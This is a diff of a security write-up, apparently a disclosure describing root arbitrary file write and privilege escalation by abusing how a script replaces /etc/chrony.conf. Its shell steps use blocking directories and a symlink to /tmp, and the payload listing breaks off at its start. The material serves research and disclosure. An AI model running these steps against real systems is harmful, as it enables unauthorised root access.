@@ -53,26 +53,30 @@ Obviously, I was not satisfied. There must be a way to allow a root arbitrary fi
 What if I provide a folder, symlink, device, etc? I can name any of these to `chrony.conf` and the filesystem will behave as expected.
 After testing with various combinations, I found I could break the first line with a non-empty folder.
 
-```
+```sh
 mkdir /etc/chrony.conf~
 touch /etc/chrony.conf~/pwn
 rm -f /etc/chrony.conf~
+```
+```
 rm: cannot remove '/etc/chrony.conf~': Is a directory
 ```
 
 The second line could also be broken if there was a folder at the destination.
 
-```
+```sh
 mkdir /etc/chrony.conf~
 mkdir /etc/chrony.conf~/chrony.conf
 mv /etc/chrony.conf /etc/chrony.conf~
+```
+```
 mv: cannot overwrite directory '/etc/chrony.conf~/chrony.conf' with non-directory
 ```
 
 With the two previous issues, I could essentially "block in place" `/etc/chrony.conf` during the script. I could make the file various Linux file types.
 What if I set `/etc/chrony.conf` as a symlink to `/tmp`?
 
-```
+```sh
 ln -s /tmp /etc/chrony.conf
 touch ./pwn
 mv "./pwn" /etc/chrony.conf
@@ -91,7 +95,7 @@ Therefore, we can get Root Arbitrary File Write + Root PrivEsc through:
 
 This resulting payload is roughly following:
 
-```
+```sh
 # 1
 mkdir ./pwn
 mkdir ./pwn/chrony.conf
